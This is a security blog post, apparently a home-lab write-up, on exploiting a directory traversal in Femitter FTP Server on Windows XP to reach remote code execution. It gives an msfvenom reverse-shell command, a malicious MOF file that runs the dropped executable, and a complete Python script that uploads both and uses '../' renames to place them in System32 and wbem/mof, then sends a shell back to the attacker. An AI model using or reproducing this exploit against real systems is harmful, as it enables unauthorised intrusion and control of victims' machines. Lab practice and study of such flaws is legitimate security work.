---
layout: single
title: Exploiting Femitter FTP in a Post-Dropzone World
date: 2019-2-16
classes: wide
header:
  teaser: /assets/images/Femitter/fem.png
tags:
  - Femitter
  - Directory Transversal
  - DropZone
  - MOF
  - FTP
  - Windows XP
  - RCE
  - hackthebox.eu
--- 
  
  After watching [Ippsec's walkthrough for Dropzone](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=1743s) on [hackthebox.eu](https://hackthebox.eu), I was pretty amazed that you could get code execution on Windows XP with just write privileges. If you have not seen the walkthrough yet, I highly encourage you watch it. He goes over MOF files, Stuxnet, MSF's interactive Ruby shell, etc. 

  In the walkthrough, he uses TFTP to upload an executable to the victim's System32 directory and then uploads a malicious MOF file to the System32/wbem/mof directory which runs the executable. I had to try this for myself! I started thinking about potential XP lab setups and settled on Femitter FTP as it allows for directory transversal. Typically, this vulnerability is used to get directory listings/enumeration, but if there was a way to use the directory transversal to write to directories of interest, we could potentially replicate what Ippsec had done on Dropzone and get code execution. 

### Getting Femitter FTP Up and Running
  The Femitter installer can be downloaded [here](http://acritum.com/fem) and about half-way down the page there is a link to 'Download the latest version.' Once placed on your XP VM, simply run the installer with all default configurations and it will place a folder called 'Femitter' in your 'Program Files' directory. Navigate to the Femitter folder and run the exe. Click on the 'FTP Server' tab and select 'Start.' Check that your VM is now running the FTP server on port 21 with a simple nmap scan.
  
### Quest for RCE
  By default, Femitter will allow anonymous authentication and will drop an authenticated user into the C:/Program Files/Femitter/Shared directory which we cannot upload files to. After changing to the 'Upload' directory, we are able to place files onto the remote box. Let's first test the well-documented directory transversal vulnerability which can be found on Exploit DB [here](https://www.exploit-db.com/exploits/15445). 

![](/assets/images/Femitter/fem_dirTransverse.png)

  Ok awesome, the exploit from nearly 10 years ago still works, this is ground breaking stuff here ;). After trying a bunch of different ways to directly upload files to directories of interest, I was only able to find 2 ways with the Linux FTP client. As long as the working directory allows uploads, there are at least a couple of ways to get the files where we want them. The first way is to PUT the file and then specify the destination path.

![](/assets/images/Femitter/putSystem32.png)

The second way, is to PUT the file and then rename the file specifying it's full path. 

![](/assets/images/Femitter/putRename.png)

Now we have everything we need to get code execution since we can use the directory transversal to put files where we want them. I just used `msfvenom` to create my executable with `msfvenom -p windows/shell_reverse_tcp lhost=<yourIP> lport=443 -f exe -o zzzzz.exe` and I had already created a malicious MOF file following along with Ippsec's walkthrough (again, watch his walkthrough.) Set up your listener before you rename or put the MOF file in `/wbem/mof` as this is the action which runs our zzzzz.exe reverse shell. 

![](/assets/images/Femitter/putMOF.png)

![](/assets/images/Femitter/shellCatch.png)

Awesome!

### Scripting the Process for Fun

```python
#!/usr/bin/python

#This script is designed to take advantage of a directory transversal vulnerability in Femitter FTP Server <= 1.04;
#Tested on XP Professional x86;
#You will need to set up a listener to catch the reverse shell;
#You might also need to manually hardcode the ftp.cwd() command below if Femitter is not in a default configuration;
#Inspired by Ippsec's DropZone walkthrough & HackTheBox.eu

#1. creates an MSF payload;
#2. creates a MOF payload;
#3. uploads both payloads to writable dir;
#4. renames them to place them in system32 and system32/wbem/mof/ respectively;

import os
import sys
from ftplib import FTP

if len(sys.argv) != 3:
    print("Usage: femitter.py lhost lport\nExample: femitter.py 10.10.10.10 443")
    exit()
else:
    lhost = sys.argv[1]
    lport = sys.argv[2]

command = "msfvenom -p windows/shell_reverse_tcp lhost=" + lhost + " lport=" + lport + " -f exe --platform windows -a x86 -o zzzzz.exe >/dev/null 2>&1"


print('[+] creating msfvenom payload...' + '\r') 
os.system(command)

#creating our hardcoded MOF payload, thanks to ippsec
print('[+] creating MOF payload...' + '\r')
mof_file = open("exploit.MOF", "w")
mof_file.write("""#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass54266
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};

instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};

Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"zzzzz.exe\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass54266\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};

instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass54266\\"";
  QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};

instance of MyClass54266 as $MyClass
{
  Name = "ClassConsumer";
};

""")
mof_file.close()

victimIP = str(raw_input("[!] enter the victim IP: "))
username = str(raw_input("[!] enter Femitter FTP username: "))
password = str(raw_input("[!] enter Femitter FTP password: "))

#login to ftp server, change directories, upload our msfvenom payload, upload our .MOF payload, catch reverse-shell
print('[+] authenticating to Femitter server...')
try:
	ftp = FTP(victimIP)
	ftp.login(username,password)
except:
	print('[-] unable to connect to server')
try:	
	print('[+] uploading payloads...')
	ftp.cwd('Upload')
	#^Change this if femitter is not in default config!!^ 
	ftp.storbinary('STOR zzzzz.exe', open('zzzzz.exe', 'rb'))
	ftp.storbinary('STOR exploit.MOF', open('exploit.MOF', 'rb'))
except:
	print('[-] unable to upload payloads, non-default configuration?')
try:	
	print('[+] executing payloads...')
	ftp.rename('zzzzz.exe', '../../../../../../windows/system32/zzzzz.exe')
	ftp.rename('exploit.MOF', '../../../../../../windows/system32/wbem/mof/exploit.MOF')
	ftp.quit()
	print('[+] enjoy that shell ;)')
except:
	print('[-] unable to execute payloads')
```



  

  
